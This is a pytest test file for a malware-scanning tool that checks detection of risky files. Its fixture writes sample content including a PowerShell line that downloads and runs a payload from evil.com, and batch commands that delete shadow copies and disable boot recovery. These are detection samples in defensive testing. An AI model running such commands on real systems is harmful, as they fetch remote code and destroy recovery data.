"""
Tests for core/scanner.py and core/analyzer.py.

Uses temporary directories with mock files to verify scanning
without touching the real filesystem.
"""

import os
import tempfile
from pathlib import Path

import pytest

from core.analyzer import FileAnalyzer
from core.models import RiskLevel
from core.scanner import FileScanner
from detectors.entropy_detector import EntropyDetector
from detectors.pattern_detector import PatternDetector


@pytest.fixture
def mock_filesystem() -> Path:
    """Create a temporary filesystem with test files."""
    tmpdir = tempfile.mkdtemp(prefix="fileguard_test_")
    root = Path(tmpdir)

    # Clean text file
    (root / "readme.txt").write_text("This is a safe readme file.")

    # Suspicious PowerShell script
    (root / "suspicious.ps1").write_text(
        "Invoke-Expression (New-Object Net.WebClient).DownloadString("
        "'http://evil.com/payload')"
    )

    # Batch file with ransomware indicators
    (root / "dangerous.bat").write_text(
        "vssadmin delete shadows /all /quiet\n"
        "bcdedit /set recoveryenabled no\n"
    )

    # Normal executable header (just MZ magic)
    (root / "normal.exe").write_bytes(b"MZ" + b"\x00" * 100)

    # File with double extension
    (root / "report.pdf.exe").write_bytes(b"MZ" + b"\x00" * 50)

    # Subdirectory with more files
    subdir = root / "subdir"
    subdir.mkdir()
    (subdir / "nested.txt").write_text("nested content")

    yield root

    # Cleanup
    import shutil
    shutil.rmtree(tmpdir, ignore_errors=True)


class TestFileAnalyzer:
    """Tests for the FileAnalyzer class."""

    def test_analyze_clean_file(self, mock_filesystem: Path) -> None:
        """Clean files should have low or zero risk score."""
        analyzer = FileAnalyzer(
            detectors=[PatternDetector(), EntropyDetector()]
        )
        result = analyzer.analyze(mock_filesystem / "readme.txt")
        assert result.risk_score < 30
        assert result.file_hash_sha256 != ""

    def test_analyze_suspicious_powershell(
        self, mock_filesystem: Path
    ) -> None:
        """Suspicious PowerShell should score higher."""
        analyzer = FileAnalyzer(
            detectors=[PatternDetector(), EntropyDetector()]
        )
        result = analyzer.analyze(mock_filesystem / "suspicious.ps1")
        assert result.risk_score > 0
        assert len(result.findings) > 0

    def test_analyze_dangerous_batch(
        self, mock_filesystem: Path
    ) -> None:
        """Batch with ransomware commands should score high."""
        analyzer = FileAnalyzer(
            detectors=[PatternDetector(), EntropyDetector()]
        )
        result = analyzer.analyze(mock_filesystem / "dangerous.bat")
        assert result.risk_score > 30
        assert any("ransomware" in f.description.lower() or
                    "shadow" in f.description.lower()
                    for f in result.findings)

    def test_analyze_double_extension(
        self, mock_filesystem: Path
    ) -> None:
        """Double extension should be flagged."""
        analyzer = FileAnalyzer(
            detectors=[PatternDetector()]
        )
        result = analyzer.analyze(mock_filesystem / "report.pdf.exe")
        assert any("double extension" in f.description.lower()
                    for f in result.findings)

    def test_analyze_nonexistent_raises(self) -> None:
        """Analyzing nonexistent file should raise."""
        analyzer = FileAnalyzer(detectors=[])
        with pytest.raises(FileNotFoundError):
            analyzer.analyze(Path("nonexistent_file_xyz.txt"))

    def test_analyze_returns_metadata(
        self, mock_filesystem: Path
    ) -> None:
        """Result should include file metadata."""
        analyzer = FileAnalyzer(detectors=[])
        result = analyzer.analyze(mock_filesystem / "readme.txt")
        assert result.file_size > 0
        assert result.created_time is not None
        assert result.file_extension == ".txt"


class TestFileScanner:
    """Tests for the FileScanner class."""

    def test_scan_directory(self, mock_filesystem: Path) -> None:
        """Scanner should find and analyze all files."""
        # Set env so safety allows temp dir
        os.environ["FILEGUARD_TESTING"] = "false"
        try:
            scanner = FileScanner(threads=2)
            results = list(scanner.scan(mock_filesystem))
            assert len(results) >= 5  # At least our 5 test files + subdir
        finally:
            os.environ["FILEGUARD_TESTING"] = "true"

    def test_scan_single_file(self, mock_filesystem: Path) -> None:
        """Scanner should handle single file targets."""
        os.environ["FILEGUARD_TESTING"] = "false"
        try:
            scanner = FileScanner(threads=1)
            results = list(scanner.scan(mock_filesystem / "readme.txt"))
            assert len(results) == 1
            assert results[0].file_path.name == "readme.txt"
        finally:
            os.environ["FILEGUARD_TESTING"] = "true"

    def test_scan_full_returns_summary(
        self, mock_filesystem: Path
    ) -> None:
        """scan_full should return a ScanSummary."""
        os.environ["FILEGUARD_TESTING"] = "false"
        try:
            scanner = FileScanner(threads=2)
            summary = scanner.scan_full(mock_filesystem)
            assert summary.scan_id != ""
            assert summary.files_scanned > 0
            assert summary.duration_seconds >= 0
        finally:
            os.environ["FILEGUARD_TESTING"] = "true"

    def test_scan_nonexistent_raises(self) -> None:
        """Scanning nonexistent path should raise."""
        scanner = FileScanner()
        with pytest.raises(FileNotFoundError):
            list(scanner.scan(Path("C:/nonexistent_path_xyz")))
